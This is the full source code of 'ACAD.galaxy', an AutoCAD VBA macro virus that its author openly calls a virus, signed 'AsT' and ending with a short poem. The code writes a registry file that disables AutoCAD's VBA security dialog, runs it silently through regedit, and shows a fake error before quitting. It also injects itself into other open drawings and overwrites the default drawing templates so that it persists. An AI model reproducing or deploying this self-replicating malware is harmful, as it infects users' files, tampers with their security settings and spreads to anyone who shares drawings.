ACAD.galaxy
semi-lame autocad virus , effects templates so is kinda resident ;)
Public WithEvents ACADApp As AcadApplication
Sub galaxy()
Set ACADApp = GetObject(, "AutoCAD.Application")
Set VBEModel = VBE
On Error GoTo runtonext
d1 = Dir("c:\firstrun.txt")
bignum = Int((150000 * Rnd) + 1)
t1 = Application.Preferences.Profiles.ActiveProfile
a1 = FileSystem.Dir("c:\cad.reg")
If a1 = "" Then
Open "c:\cad.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Autodesk\AutoCAD\R15.0\ACAD-1:409\Profiles\" & t1 & "\acadvba]"
Print #1, """AutoEmbedding""=dword:00000001"
Print #1, """AllowBreakOnErrors""=dword:00000000"
Print #1, """ShowSecurityDlg""=dword:00000000"
Print #1, "[HKEY_LOCAL_MACHINE\Software\Autodesk\AutoCAD\R15.0\ACAD-1:409\Profiles\" & t1 & "\acadvba]"
Print #1, """AutoEmbedding""=dword:00000001"
Print #1, """AllowBreakOnErrors""=dword:00000000"
Print #1, """ShowSecurityDlg""=dword:00000000"
Close #1
Reset
Shell "regedit /s c:\cad.reg", vbHide
Open "c:\firstrun.txt" For Output As #1: Close #1
MsgBox "Invalid Ordinal " & bignum, vbCritical, "Application Error"
Application.Quit
End If
le = 0
For i = 1 To Documents.Count
Set at = VBEModel.codepanes(i).codemodule
If at.lines(4, 1) = "Set VBEModel = VBE" And le = 0 Then
newroutine = at.lines(1, at.countoflines)
le = 1
i = 0
End If
If at.lines(4, 1) <> "Set VBEModel = VBE" And le = 1 Then
VBEModel.codepanes(i).codemodule.InsertLines 1, newroutine
If d1 = "firstrun.txt" Then
ACADApp.Documents(i).SaveAs ACADApp.Path & "\Template\acad.dwt", acR15_Template
ACADApp.Documents(i).SaveAs ACADApp.Path & "\Template\acadiso.dwt", acR15_Template
ACADApp.Documents(i).SaveAs ACADApp.Path & "\Template\ACAD -Named Plot Styles.dwt", acR15_Template
ACADApp.Documents(i).SaveAs ACADApp.Path & "\Template\ACADISO -Named Plot Styles.dwt", acR15_Template
d1 = ""
Kill ("c:\firstrun.txt")
End If
ACADApp.Documents(i).Save
End If
runtonext:
Next i
newroutine = ""
'if a star went out
'every time i thought of you
'the night skies
'would be empty forever
'Acad/Galaxy
End Sub

Private Sub AcadDocument_BeginClose()
 Call galaxy
'AsT
End Sub

Private Sub AcadDocument_Deactivate()
    Call galaxy
End Sub
    
Private Sub AcadDocument_Activate()
   Call galaxy
End Sub
 
